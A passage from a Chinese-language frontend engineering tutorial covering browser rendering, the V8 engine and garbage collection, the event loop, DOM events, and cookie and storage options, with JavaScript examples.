  RT -->|display: none| Skip[不进入 Render Tree]
  RT -->|visibility: hidden| Render[仍渲染但不绘制]
```

## 4.5 样式计算（Style Calculation / Recalculate Style）

```text
为每个 DOM 节点计算最终样式（ComputedStyle）：
  1. 继承属性（color / font-size 等）
  2. 优先级合并：浏览器默认 < 用户 < 作者 < !important < transition
  3. 特定性计算：
     - 内联样式：1000
     - ID 选择器：100
     - 类/属性/伪类：10
     - 元素/伪元素：1

例：#nav .list a:hover
  100 + 10 + 10 = 120
```

## 4.6 布局（Layout / Reflow）

布局阶段计算每个节点的几何信息（位置 + 尺寸）。

```text
布局步骤：
  1. 从 Render Tree 根节点开始
  2. 父节点先于子节点布局（normal flow）
  3. 计算每个节点的 x, y, width, height
  4. 创建 Layout 树（只包含可见节点）
  5. 输出 Layout 树到绘制阶段

布局算法：
  - 块级：从上到下垂直堆叠
  - 行内：水平排列
  - 浮动：脱离流但占据空间
  - 绝对/固定：相对包含块定位
```

### 4.6.1 触发 Layout（重排）的操作

```javascript
// 常见触发重排的操作：
element.offsetLeft;
element.offsetTop;
element.offsetWidth;
element.offsetHeight;
element.clientWidth;
element.clientHeight;
element.scrollTop;
element.getBoundingClientRect();
element.getComputedStyle();

window.innerWidth;
window.innerHeight;

element.style.width = '100px';
element.style.height = '100px';
element.classList.add('active');

// 写入后立即读取会强制同步重排（layout thrashing 抖动）
// 错误示例：
elements.forEach(el => {
  const height = el.offsetHeight; // 读
  el.style.height = (height * 2) + 'px'; // 写
});
// 正确：批量读写
const heights = elements.map(el => el.offsetHeight);
elements.forEach((el, i) => el.style.height = (heights[i] * 2) + 'px');
```

### 4.6.2 避免重排的优化策略

```javascript
// 1. 使用 transform 替代 top/left
element.style.transform = 'translateX(100px)';
// 2. 使用 class 集中修改样式
element.classList.add('expanded');
// 3. 文档片段 DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  fragment.appendChild(createItem(i));
}
list.appendChild(fragment);
// 4. display: none 后修改，最后再显示
element.style.display = 'none';
// ... 修改大量样式
element.style.display = 'block';
// 5. 脱离文档流：position: absolute / fixed
// 6. 虚拟列表（仅渲染可视区）
```

## 4.7 绘制（Paint / Repaint）

绘制阶段将 Layout 树转换为**绘制记录**（Paint Records），描述如何绘制像素。

```text
绘制顺序：
  1. 背景
  2. 边框
  3. 文本
  4. 子元素（递归）
  5. 轮廓（outline）

绘制输出：
  - 多个分层（Layer）的位图
  - 每个 Layer 是独立的图块（Tile）
```

### 4.7.1 触发重绘（Repaint）

```text
以下操作会触发 Repaint 但不触发 Reflow：
  - color / background / visibility（hidden）
  - box-shadow / border-radius 变化
  - text-decoration 等

注：现代浏览器对 transform / opacity 优化为 GPU 合成，零 Reflow/Repaint
```

## 4.8 图层（Layer）与合成（Compositing）

### 4.8.1 图层提升条件

```text
以下情况会创建独立图层（GPU Layer）：
  - 3D transform: translate3d / rotate3d
  - video / canvas 元素
  - position: fixed
  - filter / mask / mix-blend-mode
  - will-change: transform / opacity
  - overflow: scroll
  - opacity < 1
```

### 4.8.2 合成线程

```text
合成线程（Compositor Thread）：
  - 与主线程独立
  - 处理滚动事件
  - 处理 transform / opacity 动画（无需主线程参与）
  - 提交绘制指令到 GPU
  - GPU 上传位图并最终显示
```

### 4.8.3 will-change 使用

```css
/* 谨慎使用，过度使用反而降低性能 */
.animate-on-hover {
  will-change: transform;  /* 提前创建独立图层 */
  transition: transform 0.3s;
}
.animate-on-hover:hover {
  transform: scale(1.1);
}

/* 用完后可清除 */
.animation-done {
  will-change: auto;
}
```

## 4.9 完整渲染流水线

```mermaid
graph LR
  A[HTML] -->|Tokenizer| B[Token 流]
  B -->|Tree Builder| C[DOM Tree]
  D[CSS] -->|Parser| E[CSSOM]
  C & E --> F[Style]
  F --> G[Layout]
  G --> H[Paint]
  H --> I[Composite Layers]
  I -->|GPU| J[Screen]

  K[JS] -->|阻塞| A
  K -->|阻塞| C
  K -->|读样式| F
```

## 4.10 性能优化：RAIL 模型

```text
RAIL（Response / Animation / Idle / Load）：
  R：用户输入后 100ms 内响应
  A：每帧 16ms 内完成（60fps）
  I：主线程空闲时处理后台任务
  L：5 秒内完成首屏可交互
```

## 4.11 渲染性能分析

```javascript
// 使用 Performance API 测量 FPS
let lastTime = performance.now();
let frames = 0;
function measureFPS(now) {
  frames++;
  if (now - lastTime >= 1000) {
    console.log('FPS:', frames);
    frames = 0;
    lastTime = now;
  }
  requestAnimationFrame(measureFPS);
}
requestAnimationFrame(measureFPS);
```

## 本章要点速查

| 阶段 | 输入 | 输出 |
| --- | --- | --- |
| 解析 HTML | 字节流 | DOM 树 |
| 解析 CSS | 字节流 | CSSOM 树 |
| 合成 | DOM + CSSOM | Render Tree |
| 样式计算 | Render Tree | Computed Style |
| 布局 | Render Tree | Layout Tree |
| 绘制 | Layout Tree | Paint Records |
| 合成 | 多个 Layer | 帧 → GPU |

---

# 第 5 章 JavaScript 引擎

## 本章学习目标

- 掌握 V8 引擎的整体架构
- 理解从源码到机器码的完整编译流水线
- 熟悉 V8 内部的内存管理与垃圾回收机制
- 掌握常见 JS 性能优化手段

## 5.1 JavaScript 引擎概览

| 引擎 | 浏览器 | 开发者 |
| --- | --- | --- |
| V8 | Chrome / Edge / Node.js | Google |
| JavaScriptCore (Nitro) | Safari | Apple |
| SpiderMonkey | Firefox | Mozilla |
| Chakra | 老 Edge | Microsoft |

## 5.2 V8 引擎架构

```mermaid
graph TB
  A[JS 源码] -->|Parser 解析器| B[AST 抽象语法树]
  B -->|Ignition 解释器| C[Bytecode 字节码]
  C -->|执行| D[TurboFan 优化编译器]
  D -->|机器码| E[CPU 执行]
  C -->|执行| E
  C -->|性能数据| D
  E -->|反优化| C
```

### 5.2.1 Parser（解析器）

将 JS 源码解析为 AST（Abstract Syntax Tree，抽象语法树）。

```javascript
// 编译原理
// const sum = (a, b) => a + b
// 词法分析：const / sum / = / ( / a / , / b / ) / => / a / + / b
// 语法分析：构建 AST
```

AST 节点示例：

```text
VariableDeclaration
 ├── kind: "const"
 └── declarations: [VariableDeclarator]
      ├── id: Identifier "sum"
      └── init: ArrowFunctionExpression
           ├── params: [Identifier "a", Identifier "b"]
           └── body: BinaryExpression
                ├── operator: "+"
                ├── left: Identifier "a"
                └── right: Identifier "b"
```

### 5.2.2 Ignition 解释器

Ignition 是 V8 的字节码解释器，特点：

```text
功能：
  - 将 AST 编译为字节码（Bytecode）
  - 解释执行字节码
  - 收集 Profiling Feedback（类型反馈）
  - 与 TurboFan 协同工作

字节码指令示例：
  Ldar a1       // Load accumulator from register a1
  Add a2        // Add register a2 to accumulator
  Star a3       // Store accumulator to register a3
```

### 5.2.3 TurboFan 优化编译器

TurboFan 是 V8 的优化编译器，特点：

```text
工作流程：
  1. 收集 Ignition 执行时的 Profiling 数据
  2. 类型反馈（Type Feedback）：
     - 某个函数 + 参数总是 number → 优化为数字加法
     - 某个对象总是相同 shape → 优化为内联缓存
  3. JIT 编译为高度优化的机器码
  4. 后续调用直接执行机器码
  5. 若假设失败（Bailout / Deopt），反优化回字节码
```

```javascript
// Deopt 示例
function add(a, b) {
  return a + b;
}

add(1, 2);       // 假设：数字加法
add(3, 4);       // 优化为机器码
add('5', '6');   // 字符串拼接 → Deopt 回字节码
```

## 5.3 隐藏类（Hidden Classes）

V8 通过 **Hidden Class**（隐藏类 / Map）将动态语言的对象转换为类似 C++ 的固定结构以加速访问。

```javascript
function Point(x, y) {
  this.x = x;  // 创建 C0
  this.y = y;  // C0 → C1（添加 y 字段）
}

const p1 = new Point(1, 2);
const p2 = new Point(3, 4);
// p1 和 p2 共享同一个 Hidden Class C1

// 性能陷阱：创建后动态添加属性
const p3 = new Point(1, 2);
p3.z = 3; // p3 走不同的 C2，性能下降
```

```text
Hidden Class 转换：
  C0 = {}            // 初始空对象
   ├── add 'x' → C1  { x: <any> @ offset 0 }
   └── add 'y' → C2  { x, y @ offset 1 }
```

### 5.3.1 优化建议

```javascript
// 1. 在构造函数中初始化所有属性
function Point(x, y, z) {
  this.x = x;
  this.y = y;
  this.z = z;  // 即使为 undefined
}

// 2. 保持属性添加顺序一致
const a = { x: 1, y: 2 };  // C0 → C1 → C2
const b = { x: 1, y: 2 };  // 共享 C2

// 3. 避免 delete
delete a.x;  // 生成新的 Hidden Class（降级）

// 4. 使用 class 而非 function
class Point {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }
}
```

## 5.4 内联缓存（Inline Cache）

V8 在调用点（call site）缓存类型信息，加速属性访问与方法调用。

```javascript
function getX(obj) {
  return obj.x;
}

const p1 = { x: 1 };
const p2 = { x: 2 };

getX(p1);  // 第一次：IC 记录 obj 的 Hidden Class，缓存偏移量
getX(p2);  // 命中 IC：直接通过 offset 取值
```

```text
IC 状态机：
  1. Uninitialized：未执行
  2. Monomorphic：单一 Hidden Class（最快）
  3. Polymorphic：2-4 种 Hidden Class
  4. Megamorphic：> 4 种 Hidden Class（最慢，回归通用路径）
```

```javascript
// 避免 Megamorphic
// 错误示例：
elements.forEach(el => {
  if (el.type === 'A') el.renderA();
  else if (el.type === 'B') el.renderB();
  else if (el.type === 'C') el.renderC();
});
// 多次不同的 render 方法 → Megamorphic

// 优化：策略模式
const renderers = { A: renderA, B: renderB, C: renderC };
elements.forEach(el => renderers[el.type](el));
```

## 5.5 垃圾回收（Garbage Collection）

### 5.5.1 内存分代

V8 将堆内存分为 **新生代（Young Generation）** 和 **老生代（Old Generation）**。

```text
V8 堆结构：
  New Space
    ├── From Space（半空间，1-8MB）
    └── To Space（半空间）
  Old Space
    ├── Old Pointer Space（对象）
    └── Old Data Space（字符串等数据）
  Large Object Space（>1MB）
  Code Space（机器码）
  Map Space（Hidden Class）
```

### 5.5.2 Scavenge 算法（新生代）

新生代对象生命周期短，使用 **Scavenge（Cheney 算法）** 快速回收。

```text
Scavenge 流程：
  1. From Space 满时触发
  2. 标记存活对象（GC Root 可达）
  3. 存活对象复制到 To Space
  4. From Space 与 To Space 角色互换
  5. 经历两次 Scavenge 仍存活 → 晋升 Old Space
```

### 5.5.3 Mark-Sweep & Mark-Compact（老生代）

老生代使用 **Mark-Sweep（标记-清除）** + **Mark-Compact（标记-整理）**。

```text
Mark-Sweep：
  1. 标记阶段：从 GC Root 遍历所有可达对象
  2. 清除阶段：回收未被标记的对象内存

Mark-Compact：
  - 在 Sweep 基础上移动存活对象，消除碎片
  - 成本更高，仅在空间不足时执行
```

### 5.5.4 增量标记（Incremental Marking）

为避免 GC 暂停主线程太久，V8 采用 **增量标记**：

```text
传统 Stop-The-World：
  GC 开始 → 暂停主线程 → 标记所有对象 → 恢复主线程
  暂停时间可能 100ms+，导致卡顿

增量标记：
  GC 开始 → 主线程与 GC 线程交替执行
  每次标记少量对象（5ms 内）
  最终完成标记 → Sweep
```

### 5.5.5 引用类型与内存泄漏

```javascript
// 1. 意外全局变量
function leak() {
  leaked = 'global'; // 隐式全局
}
// 解决：使用 'use strict'

// 2. 被遗忘的定时器
const timer = setInterval(() => {
  // 持续引用大对象
}, 1000);
// 解决：clearInterval(timer)

// 3. DOM 引用
const elements = [];
function add() {
  const el = document.getElementById('app');
  elements.push(el); // el 被 elements 强引用
}
// 解决：DOM 删除时清理引用

// 4. 闭包
function outer() {
  const bigData = new Array(1000000).fill('x');
  return function inner() {
    console.log(bigData[0]); // 闭包持有 bigData
  };
}
// 解决：避免在闭包中保留不必要的大对象

// 5. WeakMap / WeakSet
const wm = new WeakMap();
wm.set(element, { /* metadata */ });
// element 被回收时，对应元数据自动清理
```

## 5.6 内存管理 API

```javascript
// Performance Memory API
console.log(performance.memory);
// { jsHeapSizeLimit, totalJSHeapSize, usedJSHeapSize }

// PerformanceObserver
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'measure') {
      console.log(`${entry.name}: ${entry.duration}ms`);
    }
  }
});
observer.observe({ entryTypes: ['measure', 'navigation', 'resource'] });

performance.mark('start-fetch');
await fetch('/api/data');
performance.mark('end-fetch');
performance.measure('fetch-duration', 'start-fetch', 'end-fetch');
```

## 5.7 JavaScript 引擎对比

```text
SpiderMonkey（Firefox）：
  - TraceMonkey / JägerMonkey / WarpMonkey 多层编译器
  - 函数级 JIT

JavaScriptCore（Safari）：
  - 4 层编译器：LLInt → Baseline → DFG → FTL
  - 低功耗设备上性能优秀

V8（Chrome）：
  - Ignition 解释器 + TurboFan 编译器
  - Sparkplug 中间层（非优化 JIT）
```

## 5.8 V8 性能优化清单

```text
1. 避免重复执行相同代码（缓存函数引用）
2. 使用 class 替代 function constructor
3. 保持对象结构稳定（Hidden Class 友好）
4. 避免 megamorphic 函数调用
5. 避免大型数组的稀疏化
6. 预分配数组大小
7. 使用 Web Worker 处理 CPU 密集任务
8. requestAnimationFrame 代替 setTimeout(0)
9. 节流 / 防抖高频事件
10. 减少内存泄漏（定时器、监听器、DOM 引用）
```

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| Parser | JS → AST |
| Ignition | AST → Bytecode |
| TurboFan | Bytecode → 优化机器码 |
| Hidden Class | 对象结构稳定 → 性能提升 |
| Inline Cache | 单态 > 多态 > 巨型态 |
| GC | 新生代 Scavenge + 老生代 Mark-Compact |
| 增量标记 | 减少 STW 暂停 |

---

# 第 6 章 事件循环（Event Loop）

## 本章学习目标

- 深入理解 Event Loop 的执行机制
- 掌握宏任务（Task）与微任务（Microtask）的区别
- 理解 async/await 的底层执行顺序
- 区分浏览器与 Node.js 的 Event Loop 差异

## 6.1 为什么需要 Event Loop

JavaScript 是 **单线程** 语言，但浏览器需要处理：
- 用户交互（点击、滚动）
- 网络请求
- 定时器
- I/O 操作

若使用同步执行模型，主线程会被阻塞。因此采用 **异步 + 事件循环**。

```text
核心矛盾：
  - 单线程无法真正并行
  - 但可让耗时任务"让出"主线程
  - 通过回调 / Promise 调度任务
```

## 6.2 调用栈（Call Stack）

调用栈是 LIFO（Last In First Out）数据结构，记录当前执行的函数调用。

```javascript
function c() {
  console.log('c');  // Step 4
}
function b() {
  c();               // Step 3
  console.log('b');  // Step 5
}
function a() {
  b();               // Step 2
  console.log('a');  // Step 6
}
a();                 // Step 1
// 输出：c b a
```

调用栈状态：

```text
Step 1: [a]
Step 2: [a, b]
Step 3: [a, b, c]
Step 4: [a, b]    ← c 执行完毕
Step 5: [a]
Step 6: []        ← a 执行完毕
```

### 6.2.1 栈溢出（Stack Overflow）

```javascript
// 错误示例：无限递归
function recursion() {
  recursion();
}
recursion();
// Uncaught RangeError: Maximum call stack size exceeded
```

## 6.3 任务队列

### 6.3.1 宏任务（Macrotask / Task）

```text
宏任务来源：
  - script（整体代码块）
  - setTimeout / setInterval
  - setImmediate（Node）
  - I/O
  - UI 渲染（浏览器）
  - postMessage
  - MessageChannel
```

### 6.3.2 微任务（Microtask）

```text
微任务来源：
  - Promise.then / catch / finally
  - async / await
  - MutationObserver
  - process.nextTick（Node）
  - queueMicrotask()
```

### 6.3.3 关键差异

```text
宏任务：
  - 每轮事件循环取一个执行
  - 任务之间可能进行 UI 渲染

微任务：
  - 当前宏任务执行完毕后立即清空微任务队列
  - 优先级高于 UI 渲染
  - 大量微任务会阻塞渲染
```

## 6.4 Event Loop 执行机制

```mermaid
graph TB
  A[开始] --> B[执行同步代码]
  B --> C[清空调用栈]
  C --> D{微任务队列空?}
  D -->|否| E[取出所有微任务执行]
  E --> D
  D -->|是| F{宏任务队列空?}
  F -->|否| G[取出 1 个宏任务执行]
  G --> B
  F -->|是| H[结束]
```

### 6.4.1 完整流程

```text
1. 执行同步代码（宏任务 script）
2. 同步代码执行完毕，调用栈清空
3. 清空微任务队列（Microtask Queue）
4. 必要时进行 UI 渲染
5. 取下一个宏任务，回到步骤 1
```

## 6.5 经典面试题

### 6.5.1 例 1

```javascript
console.log('1');

setTimeout(() => console.log('2'), 0);

Promise.resolve().then(() => console.log('3'));

console.log('4');

// 输出：1 4 3 2
// 解析：
// 同步：1, 4
// 微任务：3
// 宏任务：2
```

### 6.5.2 例 2

```javascript
async function async1() {
  console.log('async1 start');
  await async2();
  console.log('async1 end');
}

async function async2() {
  console.log('async2');
}

console.log('script start');

setTimeout(() => console.log('setTimeout'), 0);

async1();

new Promise((resolve) => {
  console.log('promise1');
  resolve();
}).then(() => console.log('promise2'));

console.log('script end');

// 输出：
// script start
// async1 start
// async2
// promise1
// script end
// async1 end
// promise2
// setTimeout
```

解析：

```text
1. 同步：script start
2. async1() 执行：async1 start → 遇到 await → 执行 async2：async2
3. await 后面的 console.log 包装为微任务，加入队列
4. new Promise 同步执行：promise1 → resolve()
5. 同步：script end
6. 同步任务结束，清空微任务队列
   - async1 end
   - promise2
7. 宏任务：setTimeout
```

### 6.5.3 例 3（复杂嵌套）

```javascript
console.log('start');

setTimeout(() => {
  console.log('setTimeout1');
  Promise.resolve().then(() => console.log('promise1'));
}, 0);

setTimeout(() => {
  console.log('setTimeout2');
  Promise.resolve().then(() => console.log('promise2'));
}, 0);

Promise.resolve().then(() => {
  console.log('promise3');
  setTimeout(() => console.log('setTimeout3'), 0);
});

console.log('end');

// 输出：start end promise3 setTimeout1 promise1 setTimeout2 promise2 setTimeout3
```

## 6.6 Node.js vs 浏览器 Event Loop

### 6.6.1 Node.js 阶段

```text
Node Event Loop 阶段（libuv）：
  1. timers：执行 setTimeout / setInterval
  2. pending callbacks：执行系统级回调
  3. idle, prepare：内部
  4. poll：获取新的 I/O 事件
  5. check：执行 setImmediate
  6. close callbacks：执行 close 事件

微任务执行时机：
  - 每个阶段切换时清空微任务队列
  - process.nextTick 优先于 Promise.then
```

### 6.6.2 浏览器 vs Node

```text
浏览器：
  - 单一队列，宏任务粒度较细
  - 渲染步骤紧跟微任务队列清空

Node.js：
  - 6 阶段循环
  - poll 阶段可能阻塞（无 timer）
  - process.nextTick 优先级最高
```

## 6.7 async/await 底层原理

```javascript
// async 函数返回 Promise
// await 等价于 Promise.then

async function test() {
  console.log(1);
  await Promise.resolve();
  console.log(2);
}

// 等价于
function test() {
  console.log(1);
  return Promise.resolve().then(() => {
    console.log(2);
  });
}
```

### 6.7.1 错误处理

```javascript
async function fetchData() {
  try {
    const res = await fetch('/api');
    const data = await res.json();
    return data;
  } catch (err) {
    console.error(err);
    throw err; // 重新抛出
  } finally {
    console.log('cleanup');
  }
}
```

## 6.8 requestAnimationFrame 与 requestIdleCallback

```javascript
// requestAnimationFrame：下一帧前执行（约 16ms）
function animate() {
  // 更新动画
  requestAnimationFrame(animate);
}
requestAnimationFrame(animate);

// requestIdleCallback：浏览器空闲时执行（低优先级任务）
requestIdleCallback((deadline) => {
  // deadline.timeRemaining() 获取剩余时间
  while (deadline.timeRemaining() > 0) {
    // 执行低优先级任务
  }
  requestIdleCallback(arguments.callee);
});
```

## 6.9 任务调度最佳实践

```javascript
// 1. 耗时任务切片
function processInChunks(tasks, chunkSize = 100) {
  return new Promise((resolve) => {
    let index = 0;
    function run() {
      const chunk = tasks.slice(index, index + chunkSize);
      chunk.forEach((task) => task());
      index += chunkSize;
      if (index < tasks.length) {
        // 让出主线程
        setTimeout(run, 0);
      } else {
        resolve();
      }
    }
    run();
  });
}

// 2. 大量数据使用 Web Worker
// 3. 避免在微任务中执行大量同步逻辑
// 4. 防抖 / 节流高频事件
```

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| 调用栈 | 同步执行，LIFO |
| 宏任务 | setTimeout / I/O / postMessage |
| 微任务 | Promise / async / MutationObserver |
| 执行顺序 | 同步 → 微任务 → 渲染 → 宏任务 |
| Node.js | 6 阶段循环 |

---

# 第 7 章 DOM 事件机制

## 本章学习目标

- 理解事件流（捕获 → 目标 → 冒泡）
- 掌握事件委托（Event Delegation）的实现
- 熟悉 Event 对象的属性与方法
- 理解自定义事件、Passive Listener 等高级特性

## 7.1 事件流（Event Flow）

### 7.1.1 三个阶段

```mermaid
graph TB
  Window[Window / Document] -->|Capture 捕获| Doc[Document]
  Doc -->|Capture| Parent[父元素]
  Parent -->|Capture| Target[目标元素]
  Target -->|Target 目标| Target
  Target -->|Bubble 冒泡| Parent
  Parent -->|Bubble| Doc
  Doc -->|Bubble| Window
```

### 7.1.2 DOM 事件流规范

```text
DOM Level 2 事件流：
  Phase 1 - Capturing Phase：事件从 window → ... → target 父元素
  Phase 2 - Target Phase：事件到达 target
  Phase 3 - Bubbling Phase：事件从 target 父元素 → ... → window
```

## 7.2 事件监听

### 7.2.1 addEventListener

```javascript
// 语法：target.addEventListener(type, listener, options)
// options：
//   - capture: 布尔值，是否在捕获阶段触发
//   - once: 是否只触发一次
//   - passive: 是否阻止不了默认行为（提升滚动性能）
//   - signal: 用于 AbortController 取消监听

const button = document.querySelector('#btn');

// 普通监听
button.addEventListener('click', (e) => {
  console.log('clicked');
});

// 一次性
button.addEventListener('click', (e) => {
  console.log('first click');
}, { once: true });

// 被动监听（Passive）
window.addEventListener('touchmove', (e) => {
  // 浏览器可以放心滚动，无需等待
  // 调用 preventDefault() 无效
}, { passive: true });

// 可取消监听
const controller = new AbortController();
button.addEventListener('click', handler, { signal: controller.signal });
// 取消
controller.abort();
```

### 7.2.2 移除监听

```javascript
// 必须传入相同函数引用才能移除
function handler(e) {
  console.log('clicked');
}
button.addEventListener('click', handler);
button.removeEventListener('click', handler);  // 成功
```

## 7.3 Event 对象

```javascript
button.addEventListener('click', (event) => {
  // 通用属性
  console.log(event.type);            // 'click'
  console.log(event.target);          // 触发元素（最深）
  console.log(event.currentTarget);   // 绑定监听的元素
  console.log(event.eventPhase);      // 1=捕获 2=目标 3=冒泡

  // 阻止冒泡
  event.stopPropagation();
  // 立即阻止冒泡 + 其他监听器
  event.stopImmediatePropagation();
  // 阻止默认行为
  event.preventDefault();
  // 默认行为是否被阻止
  console.log(event.defaultPrevented);
});
```

### 7.3.1 target vs currentTarget

```html
<ul id="list">
  <li>Item 1</li>
  <li>Item 2</li>
</ul>
```

```javascript
const list = document.getElementById('list');
list.addEventListener('click', (e) => {
  console.log(e.target);         // <li>Item 1</li>
  console.log(e.currentTarget);  // <ul id="list">
});
```

## 7.4 事件委托（Event Delegation）

事件委托利用事件冒泡，将子元素的事件监听统一挂载到父元素。

```javascript
// 传统方式（不推荐）
document.querySelectorAll('li').forEach((li) => {
  li.addEventListener('click', (e) => {
    console.log(e.target.textContent);
  });
});

// 委托方式（推荐）
const list = document.getElementById('list');
list.addEventListener('click', (e) => {
  if (e.target.matches('li.item')) {
    // 匹配目标元素
    console.log('clicked:', e.target.dataset.id);
  }
});

// 优势：
// 1. 减少内存占用（一个监听器）
// 2. 自动支持动态新增的元素
// 3. 性能更好
```

### 7.4.1 实战：列表删除

```javascript
// 场景：列表项删除按钮
const list = document.getElementById('todo-list');
list.addEventListener('click', (e) => {
  // Step 1：检查点击的是否为删除按钮
  if (!e.target.matches('.delete-btn')) return;

  // Step 2：找到最近的 li 父元素
  const li = e.target.closest('li');
  if (!li) return;

  // Step 3：移除
  li.remove();
});
```

## 7.5 常见事件类型

### 7.5.1 鼠标事件

```javascript
// click：单击
// dblclick：双击
// mousedown / mouseup：按下/释放
// mousemove：移动
// mouseover / mouseout：进入/离开（会冒泡）
// mouseenter / mouseleave：进入/离开（不冒泡，推荐）
// contextmenu：右键菜单
// wheel：滚轮
```

### 7.5.2 键盘事件

```javascript
input.addEventListener('keydown', (e) => {
  console.log(e.key);       // 按键值
  console.log(e.code);      // 物理按键
  console.log(e.ctrlKey);   // 修饰键
  console.log(e.shiftKey);
  console.log(e.altKey);
  console.log(e.metaKey);   // Mac Command 键

  if (e.key === 'Enter') {
    // 提交表单
  }
});
```

### 7.5.3 表单事件

```javascript
// focus / blur：聚焦/失焦（不冒泡）
// focusin / focusout：聚焦/失焦（冒泡版本）
// change：值变化（失焦后触发）
// input：值变化（实时）
// submit：提交
// reset：重置
```

### 7.5.4 文档/窗口事件

```javascript
// load：所有资源加载完毕
// DOMContentLoaded：DOM 解析完毕（无需等待图片、样式）
// beforeunload：页面卸载前
// unload：页面卸载
// resize：窗口大小变化
// scroll：滚动
// error：脚本错误
// visibilitychange：页面可见性变化
```

### 7.5.5 触摸事件（移动端）

```javascript
// touchstart / touchmove / touchend / touchcancel
element.addEventListener('touchstart', (e) => {
  console.log(e.touches);         // 当前所有触点
  console.log(e.targetTouches);   // 当前元素上的触点
  console.log(e.changedTouches);  // 触发事件的触点
});
```

## 7.6 自定义事件

```javascript
// 1. 使用 Event 构造函数
const event = new Event('custom-event', {
  bubbles: true,
  cancelable: true,
});

// 2. 使用 CustomEvent（可传递数据）
const customEvent = new CustomEvent('user-login', {
  detail: { userId: 123, username: 'alice' },
  bubbles: true,
});

// 3. 触发
document.getElementById('app').dispatchEvent(customEvent);

// 4. 监听
document.getElementById('app').addEventListener('user-login', (e) => {
  console.log('User logged in:', e.detail);
});
```

### 7.6.1 事件总线实现

```javascript
class EventBus {
  constructor() {
    // Step 1：使用 Map 存储事件 → 处理函数列表
    this.listeners = new Map();
  }

  // Step 2：注册事件
  on(type, handler) {
    if (!this.listeners.has(type)) {
      this.listeners.set(type, []);
    }
    this.listeners.get(type).push(handler);
  }

  // Step 3：触发事件
  emit(type, ...args) {
    const handlers = this.listeners.get(type);
    if (handlers) {
      handlers.forEach((h) => h(...args));
    }
  }

  // Step 4：取消监听
  off(type, handler) {
    const handlers = this.listeners.get(type);
    if (handlers) {
      const index = handlers.indexOf(handler);
      if (index > -1) handlers.splice(index, 1);
    }
  }

  // Step 5：一次性事件
  once(type, handler) {
    const wrapper = (...args) => {
      handler(...args);
      this.off(type, wrapper);
    };
    this.on(type, wrapper);
  }
}

const bus = new EventBus();
bus.on('user-login', (user) => console.log('welcome', user));
bus.emit('user-login', { id: 1 });
```

## 7.7 Passive Event Listeners

### 7.7.1 背景

移动端 `touchmove` 默认需要等待 JS 决定是否调用 `preventDefault()`，造成滚动卡顿。

### 7.7.2 解决方案

```javascript
// 浏览器已为 touchstart / touchmove 默认设置为 passive: true
// 自定义监听需显式指定
element.addEventListener('touchmove', handler, { passive: true });
```

## 7.8 页面生命周期事件

```mermaid
graph TB
  A[请求页面] --> B[DOMContentLoaded]
  B --> C[load 事件]
  C --> D[beforeunload]
  D --> E[unload / pagehide]
  E --> F[页面销毁]
```

```javascript
// 1. DOMContentLoaded：DOM 解析完成，无需等待样式、图片
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM ready');
});

// 2. load：所有资源加载完毕
window.addEventListener('load', () => {
  console.log('All resources loaded');
});

// 3. beforeunload：离开前确认
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  e.returnValue = '确认离开？';
});

// 4. visibilitychange：标签页切换 / 最小化
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    console.log('tab hidden');
  } else {
    console.log('tab visible');
  }
});

// 5. pagehide：页面隐藏（推荐用于替代 unload）
window.addEventListener('pagehide', () => {
  // 清理资源
});
```

## 7.9 性能优化建议

```text
1. 优先使用事件委托
2. 避免频繁 add/remove 监听
3. 使用 AbortController 批量取消
4. 高频事件使用节流（throttle）/ 防抖（debounce）
5. 滚动监听使用 passive: true
6. 及时清理无用的事件监听，避免内存泄漏
```

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| 事件流 | 捕获 → 目标 → 冒泡 |
| addEventListener | 第三参数：capture / once / passive |
| 事件委托 | 利用冒泡，统一监听父元素 |
| target | 触发元素（最深） |
| currentTarget | 绑定元素 |
| CustomEvent | 自定义事件，可传递 detail |

---

# 第 8 章 浏览器存储方案

## 本章学习目标

- 掌握 Cookie / LocalStorage / SessionStorage / IndexedDB 的差异
- 理解 Cookie 的 SameSite、HttpOnly、Secure 等属性
- 掌握存储选型决策树
- 熟悉 Web Storage 配额与持久化方案

## 8.1 存储方案对比

| 方案 | 容量 | 是否随请求发送 | 生命周期 | 访问方式 |
| --- | --- | --- | --- | --- |
| Cookie | ~4KB | 是 | 可设置过期时间 | 同步 |
| LocalStorage | ~5-10MB | 否 | 永久（除非手动删除） | 同步 |
| SessionStorage | ~5-10MB | 否 | 当前 Tab 关闭即销毁 | 同步 |
| IndexedDB | 配额大（通常 50%+ 磁盘） | 否 | 永久 | 异步（事务） |
| Cache Storage | 配额大 | 否 | 由 Service Worker 管理 | 异步（Promise） |
| WebSQL | 已废弃 | 否 | 永久 | 异步（SQL） |

## 8.2 Cookie

### 8.2.1 Cookie 基础

```javascript
// 1. 设置 Cookie
document.cookie = 'username=alice; Path=/; Max-Age=3600';

// 2. 读取 Cookie
console.log(document.cookie);
// 'username=alice; theme=dark; session=xyz'

// 3. 删除 Cookie（设置 Max-Age=0）
document.cookie = 'username=; Path=/; Max-Age=0';

// 4. 工具函数
const cookie = {
  set(name, value, days) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${encodeURIComponent(value)}; Path=/; Expires=${expires}`;
  },
  get(name) {
    const match = document.cookie.match(new RegExp('(^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[2]) : null;
  },
  remove(name) {
    this.set(name, '', -1);
  },
};
```

### 8.2.2 Cookie 属性

```http
Set-Cookie: id=xyz; 
  Path=/;                       # 路径
  Domain=example.com;           # 域
  Max-Age=3600;                 # 过期秒数
  Expires=Wed, 21 Oct 2026;     # 过期时间
  Secure;                       # 仅 HTTPS
  HttpOnly;                     # 禁止 JS 访问
  SameSite=Strict;              # 跨站策略
  Priority=High;                # Cookie 优先级
```

### 8.2.3 SameSite 属性

```text
SameSite 三个值：
  Strict：完全禁止跨站发送 Cookie
  Lax：仅 GET 导航可发送（默认值，新浏览器）
  None：必须配合 Secure 才可跨站
```

```javascript
// 服务端设置（Node.js Express）
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict',
  maxAge: 3600 * 1000,
});
